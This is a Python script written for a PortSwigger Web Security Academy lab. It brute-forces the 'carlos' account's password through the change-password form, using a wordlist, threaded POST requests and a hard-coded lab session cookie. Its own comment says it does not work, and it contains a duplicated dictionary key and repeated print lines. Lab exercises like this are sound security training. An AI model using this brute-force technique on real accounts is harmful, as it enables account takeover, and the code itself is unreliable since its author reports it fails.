#!/usr/bin/env python3
# built to solve this lab but dont work
# https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change
import requests
from threading import Thread
from time import sleep

def fetchPassword(filename):
    listPassword = list()

    with open(filename) as fd:
        for line in fd:
            listPassword.append(line.strip())

    return listPassword

def sendRequest(url, cookie, password):
    loginData = {
        'username': 'carlos',
        'current-password': password,
        'new-password-1': 'fakepassword',
        'new-password-2': 'fakefakepassword'
    }

    loginRequestText = requests.post(url, cookies=cookie, data=loginData).text

    if 'New passwords do not match' in loginRequestText:

        print(f'[+] Found password: {password}')
        print(f'[+] Found password: {password}')
        print(f'[+] Found password: {password}')
        print(f'[+] Found password: {password}')
        print(f'[+] Found password: {password}')
        print(f'[+] Found password: {password}')
        print(f'[+] Found password: {password}')

def main():
    url = 'https://0adc000e031aba308027cbb70043002c.web-security-academy.net/my-account/change-password'
    cookie = {
        'session': 'FBgtzUx1r3wpBWftG35oIcfgDksCzwfZ',
        'session': 'nOFj70Q7Bno7dG2cdAbb2l0WQ691zALh'
    }

    passwordFileName = './auth_password.txt'
    listPassword = fetchPassword(passwordFileName)
    
    for password in listPassword:
        thread = Thread(target=sendRequest, args=(url, cookie, password))
        thread.start()
        sleep(0.7)

if __name__ == '__main__':
    main()